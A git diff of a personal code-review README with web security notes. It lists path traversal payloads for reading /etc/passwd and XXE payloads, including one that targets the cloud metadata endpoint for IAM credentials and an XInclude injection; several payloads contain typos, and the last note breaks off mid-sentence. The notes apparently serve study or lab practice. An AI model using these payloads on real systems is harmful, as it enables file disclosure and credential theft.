@@ -1,4 +1,4 @@
-# Code-Review
+<img width="726" height="171" alt="image" src="https://github.com/user-attachments/assets/de8487c7-df2b-409e-8f25-b7cc7e15f713" /><img width="726" height="171" alt="image" src="https://github.com/user-attachments/assets/ce35a9a9-84a4-4b2e-a04e-d51c4eacff5d" /># Code-Review
 Repo for code review
 
 https://github.com/swisskyrepo/PayloadsAllTheThings/
@@ -22,4 +22,15 @@ Path Traversal:
 5. Try https://www.example.com/image?filename=/var/www/images/../../../etc/passwd
 6. ../../../etc/passwd%00[48.jpg]->acutal URL
 
+var/www/html/*
 
+XML Injections:
+1. <?xml>
+    <!DOCTYPE test [<ENTITY test SYSTEM "file://etc/passwd">]><stockCheck>
+2. <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [<! ENTITY test SYSTEM
+"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>
+<stockCheck>
+3.Input field Type
+productId=<hack xmlns:xi="http://www.w3.org/2001/XInclude">< xi:include parse="text" href="file:///etc/passwd"/></hack&storeId=1
+4. Saving the payload of XML in SVG file using nano pic.svg and saving it with a payload that used
